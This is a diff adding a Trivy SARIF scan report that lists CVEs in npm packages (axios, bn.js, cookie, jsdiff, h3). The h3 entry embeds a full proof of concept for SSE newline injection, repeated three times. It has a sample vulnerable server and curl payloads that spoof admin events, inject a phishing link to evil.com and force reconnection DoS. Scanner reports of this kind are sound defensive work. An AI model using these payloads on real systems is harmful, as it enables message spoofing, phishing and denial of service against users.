@@ -1,0 +1,2075 @@
+{
+  "version": "2.1.0",
+  "$schema": "https://raw.githubusercontent.com/oasis-tcs/sarif-spec/main/sarif-2.1/schema/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "tool": {
+        "driver": {
+          "fullName": "Trivy Vulnerability Scanner",
+          "informationUri": "https://github.com/aquasecurity/trivy",
+          "name": "Trivy",
+          "rules": [
+            {
+              "id": "CVE-2026-25639",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig"
+              },
+              "fullDescription": {
+                "text": "Axios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-25639",
+              "help": {
+                "text": "Vulnerability CVE-2026-25639\nSeverity: HIGH\nPackage: axios\nFixed Version: 1.13.5, 0.30.3\nLink: [CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)\nAxios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5.",
+                "markdown": "**Vulnerability CVE-2026-25639**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|axios|1.13.5, 0.30.3|[CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)|\n\nAxios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-2739",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "bn.js: bn.js: Denial of Service via calling maskn(0)"
+              },
+              "fullDescription": {
+                "text": "This affects versions of the package bn.js before 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely."
+              },
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-2739",
+              "help": {
+                "text": "Vulnerability CVE-2026-2739\nSeverity: MEDIUM\nPackage: bn.js\nFixed Version: 4.12.3, 5.2.3\nLink: [CVE-2026-2739](https://avd.aquasec.com/nvd/cve-2026-2739)\nThis affects versions of the package bn.js before 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.",
+                "markdown": "**Vulnerability CVE-2026-2739**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|MEDIUM|bn.js|4.12.3, 5.2.3|[CVE-2026-2739](https://avd.aquasec.com/nvd/cve-2026-2739)|\n\nThis affects versions of the package bn.js before 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "5.3",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "MEDIUM"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2024-47764",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "cookie: cookie accepts cookie name, path, and domain with out of bounds characters"
+              },
+              "fullDescription": {
+                "text": "cookie is a basic HTTP cookie parser and serializer for HTTP servers. The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. A similar escape can be used for path and domain, which could be abused to alter other fields of the cookie. Upgrade to 0.7.0, which updates the validation for name, path, and domain."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2024-47764",
+              "help": {
+                "text": "Vulnerability CVE-2024-47764\nSeverity: LOW\nPackage: cookie\nFixed Version: 0.7.0\nLink: [CVE-2024-47764](https://avd.aquasec.com/nvd/cve-2024-47764)\ncookie is a basic HTTP cookie parser and serializer for HTTP servers. The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. A similar escape can be used for path and domain, which could be abused to alter other fields of the cookie. Upgrade to 0.7.0, which updates the validation for name, path, and domain.",
+                "markdown": "**Vulnerability CVE-2024-47764**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|LOW|cookie|0.7.0|[CVE-2024-47764](https://avd.aquasec.com/nvd/cve-2024-47764)|\n\ncookie is a basic HTTP cookie parser and serializer for HTTP servers. The cookie name could be used to set other fields of the cookie, resulting in an unexpected cookie value. A similar escape can be used for path and domain, which could be abused to alter other fields of the cookie. Upgrade to 0.7.0, which updates the validation for name, path, and domain."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "2.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-24001",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "jsdiff: denial of service vulnerability in parsePatch and applyPatch"
+              },
+              "fullDescription": {
+                "text": "jsdiff is a JavaScript text differencing implementation. Prior to versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1, attempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory. Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed). The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected. Finally, a second and lesser interdependent bug - a ReDOS - also exhibits when those same line break characters are present in a patch\u0026#39;s *patch* header (also known as its \u0026#34;leading garbage\u0026#34;). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse. Versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1 contain a fix. As a workaround, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`."
+              },
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-24001",
+              "help": {
+                "text": "Vulnerability CVE-2026-24001\nSeverity: LOW\nPackage: diff\nFixed Version: 8.0.3, 5.2.2, 4.0.4, 3.5.1\nLink: [CVE-2026-24001](https://avd.aquasec.com/nvd/cve-2026-24001)\njsdiff is a JavaScript text differencing implementation. Prior to versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1, attempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory. Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed). The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected. Finally, a second and lesser interdependent bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse. Versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1 contain a fix. As a workaround, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`.",
+                "markdown": "**Vulnerability CVE-2026-24001**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|LOW|diff|8.0.3, 5.2.2, 4.0.4, 3.5.1|[CVE-2026-24001](https://avd.aquasec.com/nvd/cve-2026-24001)|\n\njsdiff is a JavaScript text differencing implementation. Prior to versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1, attempting to parse a patch whose filename headers contain the line break characters `\\r`, `\\u2028`, or `\\u2029` can cause the `parsePatch` method to enter an infinite loop. It then consumes memory without limit until the process crashes due to running out of memory. Applications are therefore likely to be vulnerable to a denial-of-service attack if they call `parsePatch` with a user-provided patch as input. A large payload is not needed to trigger the vulnerability, so size limits on user input do not provide any protection. Furthermore, some applications may be vulnerable even when calling `parsePatch` on a patch generated by the application itself if the user is nonetheless able to control the filename headers (e.g. by directly providing the filenames of the files to be diffed). The `applyPatch` method is similarly affected if (and only if) called with a string representation of a patch as an argument, since under the hood it parses that string using `parsePatch`. Other methods of the library are unaffected. Finally, a second and lesser interdependent bug - a ReDOS - also exhibits when those same line break characters are present in a patch's *patch* header (also known as its \"leading garbage\"). A maliciously-crafted patch header of length *n* can take `parsePatch` O(*n*³) time to parse. Versions 8.0.3, 5.2.2, 4.0.4, and 3.5.1 contain a fix. As a workaround, do not attempt to parse patches that contain any of these characters: `\\r`, `\\u2028`, or `\\u2029`."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "0.0",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "LOW"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-23527",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "h3: h3: HTTP Request Smuggling due to improper case-sensitive parsing of Transfer-Encoding header"
+              },
+              "fullDescription": {
+                "text": "H3 is a minimal H(TTP) framework built for high performance and portability. Prior to 1.15.5, there is a critical HTTP Request Smuggling vulnerability. readRawBody is doing a strict case-sensitive check for the Transfer-Encoding header. It explicitly looks for \u0026#34;chunked\u0026#34;, but per the RFC, this header should be case-insensitive. This vulnerability is fixed in 1.15.5."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-23527",
+              "help": {
+                "text": "Vulnerability CVE-2026-23527\nSeverity: HIGH\nPackage: h3\nFixed Version: 1.15.5\nLink: [CVE-2026-23527](https://avd.aquasec.com/nvd/cve-2026-23527)\nH3 is a minimal H(TTP) framework built for high performance and portability. Prior to 1.15.5, there is a critical HTTP Request Smuggling vulnerability. readRawBody is doing a strict case-sensitive check for the Transfer-Encoding header. It explicitly looks for \"chunked\", but per the RFC, this header should be case-insensitive. This vulnerability is fixed in 1.15.5.",
+                "markdown": "**Vulnerability CVE-2026-23527**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|h3|1.15.5|[CVE-2026-23527](https://avd.aquasec.com/nvd/cve-2026-23527)|\n\nH3 is a minimal H(TTP) framework built for high performance and portability. Prior to 1.15.5, there is a critical HTTP Request Smuggling vulnerability. readRawBody is doing a strict case-sensitive check for the Transfer-Encoding header. It explicitly looks for \"chunked\", but per the RFC, this header should be case-insensitive. This vulnerability is fixed in 1.15.5."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "8.9",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
+                ]
+              }
+            },
+            {
+              "id": "CVE-2026-33128",
+              "name": "LanguageSpecificPackageVulnerability",
+              "shortDescription": {
+                "text": "h3 has a Server-Sent Events Injection via Unsanitized Newlines in Event Stream Fields"
+              },
+              "fullDescription": {
+                "text": "## Summary\n\n`createEventStream` in h3 is vulnerable to Server-Sent Events (SSE) injection due to missing newline sanitization in `formatEventStreamMessage()` and `formatEventStreamComment()`. An attacker who controls any part of an SSE message field (`id`, `event`, `data`, or comment) can inject arbitrary SSE events to connected clients.\n\n## Details\n\nThe vulnerability exists in `src/utils/internal/event-stream.ts`, lines [170](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L170)-[187](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L187):\n\n```typescript\nexport function formatEventStreamComment(comment: string): string {\n  return `: ${comment}\\n\\n`;\n}\n\nexport function formatEventStreamMessage(message: EventStreamMessage): string {\n  let result = \u0026#34;\u0026#34;;\n  if (message.id) {\n    result += `id: ${message.id}\\n`;\n  }\n  if (message.event) {\n    result += `event: ${message.event}\\n`;\n  }\n  if (typeof message.retry === \u0026#34;number\u0026#34; \u0026amp;\u0026amp; Number.isInteger(message.retry)) {\n    result += `retry: ${message.retry}\\n`;\n  }\n  result += `data: ${message.data}\\n\\n`;\n  return result;\n}\n```\n\nThe SSE protocol (defined in the [WHATWG HTML spec](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation)) uses newline characters (`\\n`) as field delimiters and double newlines (`\\n\\n`) as event separators.\n\nNone of the fields (`id`, `event`, `data`, comment) are sanitized for newline characters before being interpolated into the SSE wire format. If any field value contains `\\n`, the SSE framing is broken, allowing an attacker to:\n\n1. **Inject arbitrary SSE fields** — break out of one field and add `event:`, `data:`, `id:`, or `retry:` directives\n2. **Inject entirely new SSE events** — using `\\n\\n` to terminate the current event and start a new one\n3. **Manipulate reconnection behavior** — inject `retry: 1` to force aggressive reconnection (DoS)\n4. **Override Last-Event-ID** — inject `id:` to manipulate which events are replayed on reconnection\n\n### Injection via the `event` field\n\n```\nIntended wire format:        Actual wire format (with \\n injection):\n\nevent: message               event: message\ndata: attacker: hey          event: admin              ← INJECTED\n                             data: ALL_USERS_HACKED    ← INJECTED\n                             data: attacker: hey\n```\n\nThe browser\u0026#39;s `EventSource` API parses these as two separate events: one `message` event and one `admin` event.\n\n### Injection via the `data` field\n\n```\nIntended:                    Actual (with \\n\\n injection):\n\nevent: message               event: message\ndata: bob: hi                data: bob: hi\n                                                        ← event boundary\n                             event: system              ← INJECTED event\n                             data: Reset: evil.com      ← INJECTED data\n```\n\nBefore exploit:\n\u0026lt;img width=\u0026#34;700\u0026#34; height=\u0026#34;61\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/d9d28296-0d42-40d7-b79c-d337406cbfc9\u0026#34; /\u0026gt;\n\n\u0026lt;img width=\u0026#34;713\u0026#34; height=\u0026#34;228\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/5a52debc-2775-4367-b427-df4100fe2b8e\u0026#34; /\u0026gt;\n\n## PoC\n\n### Vulnerable server (`sse-server.ts`)\n\nA realistic chat/notification server that broadcasts user input via SSE:\n\n```typescript\nimport { H3, createEventStream, getQuery } from \u0026#34;h3\u0026#34;;\nimport { serve } from \u0026#34;h3/node\u0026#34;;\n\nconst app = new H3();\nconst clients: any[] = [];\n\napp.get(\u0026#34;/events\u0026#34;, (event) =\u0026gt; {\n  const stream = createEventStream(event);\n  clients.push(stream);\n  stream.onClosed(() =\u0026gt; {\n    clients.splice(clients.indexOf(stream), 1);\n    stream.close();\n  });\n  return stream.send();\n});\n\napp.get(\u0026#34;/send\u0026#34;, async (event) =\u0026gt; {\n  const query = getQuery(event);\n  const user = query.user as string;\n  const msg = query.msg as string;\n  const type = (query.type as string) || \u0026#34;message\u0026#34;;\n\n  for (const client of clients) {\n    await client.push({ event: type, data: `${user}: ${msg}` });\n  }\n\n  return { status: \u0026#34;sent\u0026#34; };\n});\n\nserve({ fetch: app.fetch });\n```\n\n### Exploit\n\n```bash\n# 1. Inject fake \u0026#34;admin\u0026#34; event via event field\ncurl -s \u0026#34;http://localhost:3000/send?user=attacker\u0026amp;msg=hey\u0026amp;type=message%0aevent:%20admin%0adata:%20SYSTEM:%20Server%20shutting%20down\u0026#34;\n\n# 2. Inject separate phishing event via data field\ncurl -s \u0026#34;http://localhost:3000/send?user=bob\u0026amp;msg=hi%0a%0aevent:%20system%0adata:%20Password%20reset:%20http://evil.com/steal\u0026amp;type=message\u0026#34;\n\n# 3. Inject retry directive for reconnection DoS\ncurl -s \u0026#34;http://localhost:3000/send?user=x\u0026amp;msg=test%0aretry:%201\u0026amp;type=message\u0026#34;\n```\n\n### Raw wire format proving injection\n\n```\nevent: message\nevent: admin\ndata: ALL_USERS_COMPROMISED\ndata: attacker: legit\n\n```\n\nThe browser\u0026#39;s `EventSource` fires this as an `admin` event with data `ALL_USERS_COMPROMISED` — entirely controlled by the attacker.\n\nProof:\n\n\u0026lt;img width=\u0026#34;856\u0026#34; height=\u0026#34;275\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/111d3fde-e461-4e44-8112-9f19fff41fec\u0026#34; /\u0026gt;\n\n\u0026lt;img width=\u0026#34;950\u0026#34; height=\u0026#34;156\u0026#34; alt=\u0026#34;image\u0026#34; src=\u0026#34;https://github.com/user-attachments/assets/ff750f9c-e5d9-4aa4-b48a-20b49747d2ab\u0026#34; /\u0026gt;\n\n\n## Impact\n\nAn attacker who can influence any field of an SSE message (common in chat applications, notification systems, live dashboards, AI streaming responses, and collaborative tools) can inject arbitrary SSE events that all connected clients will process as legitimate.\n\n**Attack scenarios:**\n\n- **Cross-user content injection** — inject fake messages in chat applications\n- **Phishing** — inject fake system notifications with malicious links\n- **Event spoofing** — trigger client-side handlers for privileged event types (e.g., `admin`, `system`)\n- **Reconnection DoS** — inject `retry: 1` to force all clients to reconnect every 1ms\n- **Last-Event-ID manipulation** — override the event ID to cause event replay or skipping on reconnection\n\nThis is a framework-level vulnerability, not a developer misconfiguration — the framework\u0026#39;s API accepts arbitrary strings but does not enforce the SSE protocol\u0026#39;s invariant that field values must not contain newlines."
+              },
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "helpUri": "https://avd.aquasec.com/nvd/cve-2026-33128",
+              "help": {
+                "text": "Vulnerability CVE-2026-33128\nSeverity: HIGH\nPackage: h3\nFixed Version: 2.0.1-rc.15, 1.15.6\nLink: [CVE-2026-33128](https://avd.aquasec.com/nvd/cve-2026-33128)\n## Summary\n\n`createEventStream` in h3 is vulnerable to Server-Sent Events (SSE) injection due to missing newline sanitization in `formatEventStreamMessage()` and `formatEventStreamComment()`. An attacker who controls any part of an SSE message field (`id`, `event`, `data`, or comment) can inject arbitrary SSE events to connected clients.\n\n## Details\n\nThe vulnerability exists in `src/utils/internal/event-stream.ts`, lines [170](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L170)-[187](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L187):\n\n```typescript\nexport function formatEventStreamComment(comment: string): string {\n  return `: ${comment}\\n\\n`;\n}\n\nexport function formatEventStreamMessage(message: EventStreamMessage): string {\n  let result = \"\";\n  if (message.id) {\n    result += `id: ${message.id}\\n`;\n  }\n  if (message.event) {\n    result += `event: ${message.event}\\n`;\n  }\n  if (typeof message.retry === \"number\" \u0026\u0026 Number.isInteger(message.retry)) {\n    result += `retry: ${message.retry}\\n`;\n  }\n  result += `data: ${message.data}\\n\\n`;\n  return result;\n}\n```\n\nThe SSE protocol (defined in the [WHATWG HTML spec](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation)) uses newline characters (`\\n`) as field delimiters and double newlines (`\\n\\n`) as event separators.\n\nNone of the fields (`id`, `event`, `data`, comment) are sanitized for newline characters before being interpolated into the SSE wire format. If any field value contains `\\n`, the SSE framing is broken, allowing an attacker to:\n\n1. **Inject arbitrary SSE fields** — break out of one field and add `event:`, `data:`, `id:`, or `retry:` directives\n2. **Inject entirely new SSE events** — using `\\n\\n` to terminate the current event and start a new one\n3. **Manipulate reconnection behavior** — inject `retry: 1` to force aggressive reconnection (DoS)\n4. **Override Last-Event-ID** — inject `id:` to manipulate which events are replayed on reconnection\n\n### Injection via the `event` field\n\n```\nIntended wire format:        Actual wire format (with \\n injection):\n\nevent: message               event: message\ndata: attacker: hey          event: admin              ← INJECTED\n                             data: ALL_USERS_HACKED    ← INJECTED\n                             data: attacker: hey\n```\n\nThe browser's `EventSource` API parses these as two separate events: one `message` event and one `admin` event.\n\n### Injection via the `data` field\n\n```\nIntended:                    Actual (with \\n\\n injection):\n\nevent: message               event: message\ndata: bob: hi                data: bob: hi\n                                                        ← event boundary\n                             event: system              ← INJECTED event\n                             data: Reset: evil.com      ← INJECTED data\n```\n\nBefore exploit:\n\u003cimg width=\"700\" height=\"61\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d9d28296-0d42-40d7-b79c-d337406cbfc9\" /\u003e\n\n\u003cimg width=\"713\" height=\"228\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5a52debc-2775-4367-b427-df4100fe2b8e\" /\u003e\n\n## PoC\n\n### Vulnerable server (`sse-server.ts`)\n\nA realistic chat/notification server that broadcasts user input via SSE:\n\n```typescript\nimport { H3, createEventStream, getQuery } from \"h3\";\nimport { serve } from \"h3/node\";\n\nconst app = new H3();\nconst clients: any[] = [];\n\napp.get(\"/events\", (event) =\u003e {\n  const stream = createEventStream(event);\n  clients.push(stream);\n  stream.onClosed(() =\u003e {\n    clients.splice(clients.indexOf(stream), 1);\n    stream.close();\n  });\n  return stream.send();\n});\n\napp.get(\"/send\", async (event) =\u003e {\n  const query = getQuery(event);\n  const user = query.user as string;\n  const msg = query.msg as string;\n  const type = (query.type as string) || \"message\";\n\n  for (const client of clients) {\n    await client.push({ event: type, data: `${user}: ${msg}` });\n  }\n\n  return { status: \"sent\" };\n});\n\nserve({ fetch: app.fetch });\n```\n\n### Exploit\n\n```bash\n# 1. Inject fake \"admin\" event via event field\ncurl -s \"http://localhost:3000/send?user=attacker\u0026msg=hey\u0026type=message%0aevent:%20admin%0adata:%20SYSTEM:%20Server%20shutting%20down\"\n\n# 2. Inject separate phishing event via data field\ncurl -s \"http://localhost:3000/send?user=bob\u0026msg=hi%0a%0aevent:%20system%0adata:%20Password%20reset:%20http://evil.com/steal\u0026type=message\"\n\n# 3. Inject retry directive for reconnection DoS\ncurl -s \"http://localhost:3000/send?user=x\u0026msg=test%0aretry:%201\u0026type=message\"\n```\n\n### Raw wire format proving injection\n\n```\nevent: message\nevent: admin\ndata: ALL_USERS_COMPROMISED\ndata: attacker: legit\n\n```\n\nThe browser's `EventSource` fires this as an `admin` event with data `ALL_USERS_COMPROMISED` — entirely controlled by the attacker.\n\nProof:\n\n\u003cimg width=\"856\" height=\"275\" alt=\"image\" src=\"https://github.com/user-attachments/assets/111d3fde-e461-4e44-8112-9f19fff41fec\" /\u003e\n\n\u003cimg width=\"950\" height=\"156\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ff750f9c-e5d9-4aa4-b48a-20b49747d2ab\" /\u003e\n\n\n## Impact\n\nAn attacker who can influence any field of an SSE message (common in chat applications, notification systems, live dashboards, AI streaming responses, and collaborative tools) can inject arbitrary SSE events that all connected clients will process as legitimate.\n\n**Attack scenarios:**\n\n- **Cross-user content injection** — inject fake messages in chat applications\n- **Phishing** — inject fake system notifications with malicious links\n- **Event spoofing** — trigger client-side handlers for privileged event types (e.g., `admin`, `system`)\n- **Reconnection DoS** — inject `retry: 1` to force all clients to reconnect every 1ms\n- **Last-Event-ID manipulation** — override the event ID to cause event replay or skipping on reconnection\n\nThis is a framework-level vulnerability, not a developer misconfiguration — the framework's API accepts arbitrary strings but does not enforce the SSE protocol's invariant that field values must not contain newlines.",
+                "markdown": "**Vulnerability CVE-2026-33128**\n| Severity | Package | Fixed Version | Link |\n| --- | --- | --- | --- |\n|HIGH|h3|2.0.1-rc.15, 1.15.6|[CVE-2026-33128](https://avd.aquasec.com/nvd/cve-2026-33128)|\n\n## Summary\n\n`createEventStream` in h3 is vulnerable to Server-Sent Events (SSE) injection due to missing newline sanitization in `formatEventStreamMessage()` and `formatEventStreamComment()`. An attacker who controls any part of an SSE message field (`id`, `event`, `data`, or comment) can inject arbitrary SSE events to connected clients.\n\n## Details\n\nThe vulnerability exists in `src/utils/internal/event-stream.ts`, lines [170](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L170)-[187](https://github.com/h3js/h3/blob/52c82e18bb643d124b8b9ec3b1f62b081f044611/src/utils/internal/event-stream.ts#L187):\n\n```typescript\nexport function formatEventStreamComment(comment: string): string {\n  return `: ${comment}\\n\\n`;\n}\n\nexport function formatEventStreamMessage(message: EventStreamMessage): string {\n  let result = \"\";\n  if (message.id) {\n    result += `id: ${message.id}\\n`;\n  }\n  if (message.event) {\n    result += `event: ${message.event}\\n`;\n  }\n  if (typeof message.retry === \"number\" \u0026\u0026 Number.isInteger(message.retry)) {\n    result += `retry: ${message.retry}\\n`;\n  }\n  result += `data: ${message.data}\\n\\n`;\n  return result;\n}\n```\n\nThe SSE protocol (defined in the [WHATWG HTML spec](https://html.spec.whatwg.org/multipage/server-sent-events.html#event-stream-interpretation)) uses newline characters (`\\n`) as field delimiters and double newlines (`\\n\\n`) as event separators.\n\nNone of the fields (`id`, `event`, `data`, comment) are sanitized for newline characters before being interpolated into the SSE wire format. If any field value contains `\\n`, the SSE framing is broken, allowing an attacker to:\n\n1. **Inject arbitrary SSE fields** — break out of one field and add `event:`, `data:`, `id:`, or `retry:` directives\n2. **Inject entirely new SSE events** — using `\\n\\n` to terminate the current event and start a new one\n3. **Manipulate reconnection behavior** — inject `retry: 1` to force aggressive reconnection (DoS)\n4. **Override Last-Event-ID** — inject `id:` to manipulate which events are replayed on reconnection\n\n### Injection via the `event` field\n\n```\nIntended wire format:        Actual wire format (with \\n injection):\n\nevent: message               event: message\ndata: attacker: hey          event: admin              ← INJECTED\n                             data: ALL_USERS_HACKED    ← INJECTED\n                             data: attacker: hey\n```\n\nThe browser's `EventSource` API parses these as two separate events: one `message` event and one `admin` event.\n\n### Injection via the `data` field\n\n```\nIntended:                    Actual (with \\n\\n injection):\n\nevent: message               event: message\ndata: bob: hi                data: bob: hi\n                                                        ← event boundary\n                             event: system              ← INJECTED event\n                             data: Reset: evil.com      ← INJECTED data\n```\n\nBefore exploit:\n\u003cimg width=\"700\" height=\"61\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d9d28296-0d42-40d7-b79c-d337406cbfc9\" /\u003e\n\n\u003cimg width=\"713\" height=\"228\" alt=\"image\" src=\"https://github.com/user-attachments/assets/5a52debc-2775-4367-b427-df4100fe2b8e\" /\u003e\n\n## PoC\n\n### Vulnerable server (`sse-server.ts`)\n\nA realistic chat/notification server that broadcasts user input via SSE:\n\n```typescript\nimport { H3, createEventStream, getQuery } from \"h3\";\nimport { serve } from \"h3/node\";\n\nconst app = new H3();\nconst clients: any[] = [];\n\napp.get(\"/events\", (event) =\u003e {\n  const stream = createEventStream(event);\n  clients.push(stream);\n  stream.onClosed(() =\u003e {\n    clients.splice(clients.indexOf(stream), 1);\n    stream.close();\n  });\n  return stream.send();\n});\n\napp.get(\"/send\", async (event) =\u003e {\n  const query = getQuery(event);\n  const user = query.user as string;\n  const msg = query.msg as string;\n  const type = (query.type as string) || \"message\";\n\n  for (const client of clients) {\n    await client.push({ event: type, data: `${user}: ${msg}` });\n  }\n\n  return { status: \"sent\" };\n});\n\nserve({ fetch: app.fetch });\n```\n\n### Exploit\n\n```bash\n# 1. Inject fake \"admin\" event via event field\ncurl -s \"http://localhost:3000/send?user=attacker\u0026msg=hey\u0026type=message%0aevent:%20admin%0adata:%20SYSTEM:%20Server%20shutting%20down\"\n\n# 2. Inject separate phishing event via data field\ncurl -s \"http://localhost:3000/send?user=bob\u0026msg=hi%0a%0aevent:%20system%0adata:%20Password%20reset:%20http://evil.com/steal\u0026type=message\"\n\n# 3. Inject retry directive for reconnection DoS\ncurl -s \"http://localhost:3000/send?user=x\u0026msg=test%0aretry:%201\u0026type=message\"\n```\n\n### Raw wire format proving injection\n\n```\nevent: message\nevent: admin\ndata: ALL_USERS_COMPROMISED\ndata: attacker: legit\n\n```\n\nThe browser's `EventSource` fires this as an `admin` event with data `ALL_USERS_COMPROMISED` — entirely controlled by the attacker.\n\nProof:\n\n\u003cimg width=\"856\" height=\"275\" alt=\"image\" src=\"https://github.com/user-attachments/assets/111d3fde-e461-4e44-8112-9f19fff41fec\" /\u003e\n\n\u003cimg width=\"950\" height=\"156\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ff750f9c-e5d9-4aa4-b48a-20b49747d2ab\" /\u003e\n\n\n## Impact\n\nAn attacker who can influence any field of an SSE message (common in chat applications, notification systems, live dashboards, AI streaming responses, and collaborative tools) can inject arbitrary SSE events that all connected clients will process as legitimate.\n\n**Attack scenarios:**\n\n- **Cross-user content injection** — inject fake messages in chat applications\n- **Phishing** — inject fake system notifications with malicious links\n- **Event spoofing** — trigger client-side handlers for privileged event types (e.g., `admin`, `system`)\n- **Reconnection DoS** — inject `retry: 1` to force all clients to reconnect every 1ms\n- **Last-Event-ID manipulation** — override the event ID to cause event replay or skipping on reconnection\n\nThis is a framework-level vulnerability, not a developer misconfiguration — the framework's API accepts arbitrary strings but does not enforce the SSE protocol's invariant that field values must not contain newlines."
+              },
+              "properties": {
+                "precision": "very-high",
+                "security-severity": "7.5",
+                "tags": [
+                  "vulnerability",
+                  "security",
+                  "HIGH"
